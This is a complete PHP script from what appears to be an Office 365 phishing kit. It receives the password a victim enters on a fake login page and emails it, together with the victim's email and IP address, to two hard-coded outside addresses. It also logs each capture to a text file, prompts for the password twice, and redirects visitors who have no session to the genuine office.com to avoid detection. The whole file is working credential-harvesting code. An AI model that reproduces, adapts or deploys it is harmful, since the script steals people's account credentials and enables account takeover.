<?php
session_start();
if(isset($_SESSION['lgn'])){



if(isset($_POST['password'])){
	$password = $_POST['password'];
	if(strlen($password)>5){

	$email = $_SESSION['eml'];
	$ip = $_SESSION['ip'];

    $to = "rev1047x@gmail.com,jiggyruzzinc90@yandex.com"; // this is your Email address
    $from = $ip.'@'.rand(10001,999999).'.'.gethostname(); // this is the sender's Email address
    $subject = "RCPH O365 Rezult V9";



    $message = $email." | Pwxd: ".$password." | ".$ip. "\n\n";
  /*  $headers = "From:" . $from;
    $headers2 = "From:" . $to;
  //  mail($to,$subject,$message,$headers); */


	$emailSubject = $subject;
	$mailto = $to;
	$body = $message;
	$headers = "From:$from\r\n"; // This takes the email and displays it as who this email is from.
	$headers .= "Content-type: text/html\r\n"; // This tells the server to turn the coding into the text.
	$success = @mail($to, $emailSubject, $body, $headers);


	$contents = $message;
	$file = "resultlist.txt";
	file_put_contents($file, $contents, FILE_APPEND | LOCK_EX);

    if(isset($_SESSION['county'])){
		unset($_SESSION['county']);
		header("Location: main.php");
		$_SESSION['finished'] = '1';
		$_SESSION['codex'] = '1';

	}  else {
      $_SESSION['county'] = '1';
      header("Location: main.php");

    }

} else {
		$_SESSION['county'] = '1';
      	header("Location: main.php");
	   }
}	 else {
      	header("Location: main.php");
	   }
	}
 else { header("Location: https://www.office.com"); }

?>
